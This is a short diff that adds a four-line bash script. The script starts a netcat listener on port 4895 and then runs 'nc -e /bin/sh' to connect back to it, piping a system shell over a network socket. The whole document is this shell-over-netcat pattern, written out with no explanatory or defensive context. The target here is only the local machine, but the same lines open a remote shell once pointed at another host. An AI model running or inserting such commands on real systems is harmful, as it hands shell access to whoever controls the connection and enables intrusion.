@@ -1,0 +1,4 @@
+#!/bin/bash
+
+nc -lvp 4895
+nc -e /bin/sh 127.0.0.1 4895
